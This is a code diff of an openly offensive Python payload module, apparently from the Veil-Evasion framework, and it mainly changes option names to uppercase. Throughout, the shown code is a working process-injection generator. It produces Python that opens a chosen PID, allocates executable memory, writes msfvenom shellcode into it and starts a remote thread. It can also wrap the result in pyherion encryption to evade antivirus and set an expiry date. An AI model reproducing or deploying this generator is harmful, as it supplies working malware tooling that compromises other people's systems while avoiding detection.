@@ -20,7 +20,7 @@ from modules.common import encryption
 
 
 class Payload:
-    
+
     def __init__(self):
         # required options
         self.description = "Payload which injects and executes shellcode into the memory of a process you specify."
@@ -29,15 +29,17 @@ class Payload:
         self.extension = "py"
 
         self.shellcode = shellcode.Shellcode()
-        
-        # options we require user interaction for- format is {Option : [Value, Description]]}
-        self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
-                                 "use_pyherion" : ["N", "Use the pyherion encrypter"],
-                                 "pid_number" : ["1234", "PID # to inject"],
-                                 "expire_payload" : ["X", "Optional: Payloads expire after \"X\" days"]}
-        
+
+        # options we require user interaction for- format is {OPTION : [Value, Description]]}
+        self.required_options = {
+                                    "COMPILE_TO_EXE" : ["Y", "Compile to an executable"],
+                                    "USE_PYHERION"   : ["N", "Use the pyherion encrypter"],
+                                    "PID_NUMBER"     : ["1234", "PID # to inject"],
+                                    "EXPIRE_PAYLOAD" : ["X", "Optional: Payloads expire after \"Y\" days (\"X\" disables feature)"]
+                                 }
+
     def generate(self):
-            if self.required_options["expire_payload"][0].lower() == "x":
+            if self.required_options["EXPIRE_PAYLOAD"][0].lower() == "x":
 
                 # Generate Shellcode Using msfvenom
                 Shellcode = self.shellcode.generate()
@@ -60,14 +62,14 @@ class Payload:
                 PayloadCode += memcommit_variable + ' = 0x00001000\n'
                 PayloadCode += kernel32_variable + ' = windll.kernel32\n'
                 PayloadCode += ShellcodeVariableName + ' = \"' + Shellcode + '\"\n'
-                PayloadCode += pid_num_variable + ' = ' + self.required_options["pid_number"][0] +'\n'
+                PayloadCode += pid_num_variable + ' = ' + self.required_options["PID_NUMBER"][0] +'\n'
                 PayloadCode += shell_length_variable + ' = len(' + ShellcodeVariableName + ')\n\n'
                 PayloadCode += prochandle_variable + ' = ' + kernel32_variable + '.OpenProcess(' + processall_variable + ', False, ' + pid_num_variable + ')\n'
                 PayloadCode += memalloc_variable + ' = ' + kernel32_variable + '.VirtualAllocEx(' + prochandle_variable + ', 0, ' + shell_length_variable + ', ' + memcommit_variable + ', ' + pagerwx_variable + ')\n'
                 PayloadCode += kernel32_variable + '.WriteProcessMemory(' + prochandle_variable + ', ' + memalloc_variable + ', ' + ShellcodeVariableName + ', ' + shell_length_variable + ', 0)\n'
                 PayloadCode += kernel32_variable + '.CreateRemoteThread(' + prochandle_variable + ', None, 0, ' + memalloc_variable + ', 0, 0, 0)\n'
 
-                if self.required_options["use_pyherion"][0].lower() == "y":
+                if self.required_options["USE_PYHERION"][0].lower() == "y":
                     PayloadCode = encryption.pyherion(PayloadCode)
 
                 return PayloadCode
@@ -76,7 +78,7 @@ class Payload:
 
                 # Get our current date and add number of days to the date
                 todaysdate = date.today()
-                expiredate = str(todaysdate + timedelta(days=int(self.required_options["expire_payload"][0])))
+                expiredate = str(todaysdate + timedelta(days=int(self.required_options["EXPIRE_PAYLOAD"][0])))
 
                 # Generate Shellcode Using msfvenom
                 Shellcode = self.shellcode.generate()
@@ -105,7 +107,7 @@ class Payload:
                 PayloadCode += memcommit_variable + ' = 0x00001000\n'
                 PayloadCode += kernel32_variable + ' = windll.kernel32\n'
                 PayloadCode += ShellcodeVariableName + ' = \"' + Shellcode + '\"\n'
-                PayloadCode += pid_num_variable + ' = ' + self.required_options["pid_number"][0] +'\n'
+                PayloadCode += pid_num_variable + ' = ' + self.required_options["PID_NUMBER"][0] +'\n'
                 PayloadCode += shell_length_variable + ' = len(' + ShellcodeVariableName + ')\n\n'
                 PayloadCode += 'if ' + RandToday + ' < ' + RandExpire + ':\n'
                 PayloadCode += '\t' + prochandle_variable + ' = ' + kernel32_variable + '.OpenProcess(' + processall_variable + ', False, ' + pid_num_variable + ')\n'
@@ -113,7 +115,7 @@ class Payload:
                 PayloadCode += '\t' + kernel32_variable + '.WriteProcessMemory(' + prochandle_variable + ', ' + memalloc_variable + ', ' + ShellcodeVariableName + ', ' + shell_length_variable + ', 0)\n'
                 PayloadCode += '\t' + kernel32_variable + '.CreateRemoteThread(' + prochandle_variable + ', None, 0, ' + memalloc_variable + ', 0, 0, 0)\n'
 
-                if self.required_options["use_pyherion"][0].lower() == "y":
+                if self.required_options["USE_PYHERION"][0].lower() == "y":
                     PayloadCode = encryption.pyherion(PayloadCode)
 
                 return PayloadCode
